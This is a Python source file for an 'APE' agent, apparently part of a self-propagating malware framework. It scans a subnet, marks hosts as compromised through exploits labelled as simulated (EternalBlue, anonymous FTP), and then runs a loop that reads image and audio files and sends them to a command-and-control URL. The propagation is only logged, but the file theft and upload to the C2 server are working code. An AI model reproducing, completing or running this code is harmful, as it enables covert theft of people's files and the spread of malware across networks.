import logging
import time
import os
from modules.scanner import intelligent_scan
from modules.discovery import discover_files
from modules.ace import ace_exfiltrate

# A list of simulated "vulnerabilities" the APE can "exploit"
SIMULATED_VULNERABILITIES = {
    445: "EternalBlue (Simulated)", # SMB
    21: "Anonymous FTP Write (Simulated)",
}

class ApeAgent:
    def __init__(self, c2_url, initial_subnet="192.168.1."):
        self.c2_url = c2_url
        self.subnet = initial_subnet
        self.compromised_hosts = set()
        self.exfiltrated_files = set()
        logging.info("APE Agent Initialized.")

    def scan_and_profile(self):
        """Scans the network to find potential targets."""
        logging.info("APE: Scanning network for new targets...")
        targets = intelligent_scan(self.subnet)
        new_targets = [t for t in targets if t['ip'] not in self.compromised_hosts]
        logging.info(f"APE: Found {len(new_targets)} new potential targets.")
        return new_targets

    def propagate(self, target):
        """Attempts to propagate to a new target."""
        logging.info(f"APE: Attempting to propagate to {target['ip']}...")
        for port in target['open_ports']:
            if port in SIMULATED_VULNERABILITIES:
                exploit = SIMULATED_VULNERABILITIES[port]
                logging.info(f"APE: Found potential vulnerability '{exploit}' on port {port}. Simulating exploit...")
                logging.info(f"APE: Propagation to {target['ip']} successful!")
                self.compromised_hosts.add(target['ip'])
                return True
        logging.info(f"APE: No known vulnerabilities found on {target['ip']}. Cannot propagate.")
        return False

    def hunt_and_exfiltrate(self, host_ip):
        """Hunts for valuable files on a compromised host and exfiltrates them."""
        logging.info(f"APE: Hunting for valuable files on {host_ip}...")
        valuable_files = discover_files('image', '.')
        valuable_files.extend(discover_files('audio', '.'))

        for f in valuable_files:
            if f not in self.exfiltrated_files:
                logging.info(f"APE: Found new file: {f}. Exfiltrating...")
                try:
                    with open(f, 'rb') as file_data:
                        ace_exfiltrate(file_data.read(), self.c2_url)
                    self.exfiltrated_files.add(f)
                    logging.info(f"APE: Successfully exfiltrated {f}.")
                except Exception as e:
                    logging.error(f"APE: Failed to exfiltrate {f}: {e}")

    def run(self):
        """The main loop for the APE agent."""
        logging.info("--- APE Engine Unleashed ---")
        while True:
            targets = self.scan_and_profile()
            for target in targets:
                if self.propagate(target):
                    self.hunt_and_exfiltrate(target['ip'])

            logging.info("APE: Cycle complete. Sleeping for 60 seconds...")
            time.sleep(60)

def unleash_ape(c2_url, subnet):
    """Entry point to start the APE engine."""
    agent = ApeAgent(c2_url, subnet)
    agent.run()